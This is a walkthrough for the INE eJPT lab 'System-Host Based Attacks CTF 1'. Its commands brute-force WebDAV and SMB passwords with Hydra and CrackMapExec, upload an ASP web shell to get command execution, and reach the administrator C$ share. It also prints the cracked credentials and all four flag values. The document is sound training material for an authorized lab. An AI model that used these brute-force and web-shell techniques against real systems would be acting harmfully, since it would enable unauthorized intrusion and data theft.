# INE eJPT — Host & Network Penetration Testing: System-Host Based Attacks CTF 1

**Course:** INE / eJPT — Host & Network Penetration Testing  
**Lab:** System-Host Based Attacks CTF 1  
**Author:** Zeliha Zengin

---

## Lab Environment

GUI access to a Kali machine is provided. Two targets: `target1.ine.local` and `target2.ine.local`.

- **Flag 1:** User `bob` may have a weak password — brute-force into the server. (`target1`)
- **Flag 2:** Valuable files are often on the C: drive — explore it. (`target1`)
- **Flag 3:** Guess SMB user credentials to uncover the next flag. (`target2`)
- **Flag 4:** The Desktop directory may hold what you're looking for. (`target2`)

Useful files: `.../wordlists/common_users.txt`, `.../wordlists/unix_passwords.txt`, `/usr/share/webshells/asp/webshell.asp`

**Tools used:** Nmap · Hydra · Cadaver · CrackMapExec · Metasploit

> *All work is performed against an authorized INE training lab for eJPT exam preparation.*

## Flag 1 — Brute-forcing `bob` over WebDAV

```bash
cat /etc/hosts
nmap -sV -A -Pn -p- target1.ine.local
```

Port 80 hosts a WebDAV site. The username is `bob`; brute-force the password (two options):

```bash
# CrackMapExec
crackmapexec smb target1.ine.local -u bob -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

# Hydra (HTTP GET auth)
hydra -l bob -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target1.ine.local http-get
```

Found **bob : password_123321**. Read the flag from the WebDAV directory (any of these):

```bash
# Browser / dirb
dirb http://target1.ine.local -u bob:password_123321
http://<ip>/webdav/flag1.txt

# curl
curl http://<ip>/webdav/flag1.txt -u bob:password_123321

# cadaver
cadaver http://target1.ine.local/webdav/   # bob / password_123321
dav:/> cat flag1.txt
```

> 🏁 **FLAG 1:** `e41f3c26e682498f8b4e5481e5ff9eb8`

## Flag 2 — ASP web shell on the C: drive

WebDAV allows uploads. Confirm with davtest, then upload an ASP web shell with cadaver:

```bash
davtest -auth bob:password_123321 -url http://target1.ine.local/webdav
cadaver http://target1.ine.local/webdav/
dav:/> put /usr/share/webshells/asp/webshell.asp
```

Browse to the shell and run Windows commands to read the flag:

```bash
http://<ip>/webdav/webshell.asp
dir C:\
type C:\flag2.txt
```

> **Note:** Metasploit alternative: `search webdav` → the WebDAV upload module with bob's creds gives a session too.

> 🏁 **FLAG 2:** `f4c90c9f407d4916a0cdaa5217aeab21`

## Flag 3 — SMB credential guessing on target2

Spray SMB credentials with Hydra:

```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt smb://target2.ine.local
```

Several pairs are found, including **administrator : pineapple**. Access the C$ share:

```bash
crackmapexec smb target2.ine.local -u administrator -p pineapple --shares
smbclient //target2.ine.local/C$ -U administrator
# then: cat flag3.txt
```

> 🏁 **FLAG 3:** `79b87a8ef8724d9997c774aadaf360a4`

## Flag 4 — Administrator Desktop

From the C$ share, navigate to the Administrator's Desktop:

```bash
cd Users\Administrator\Desktop
type flag4.txt
```

> 🏁 **FLAG 4:** `041bb67e9d0a43ccad10abf1e1d66dba`

## Summary

| Flag | Technique |
| --- | --- |
| 1 | WebDAV password brute-force (CrackMapExec / Hydra) |
| 2 | ASP web shell upload via WebDAV → read C: drive |
| 3 | SMB credential spraying (Hydra) → C$ share |
| 4 | Enumerating the Administrator Desktop |

### Key Takeaways

- WebDAV with write access is an upload-to-RCE path — confirm with `davtest`.
- `cadaver` is purpose-built for WebDAV; prefer it over curl for uploads.
- On Windows shells use `type` (not `cat`) and `dir` (not `ls`).
- Admin SMB credentials give `C$` access to the whole drive.

---

*Write-up by Zeliha Zengin · eJPT preparation*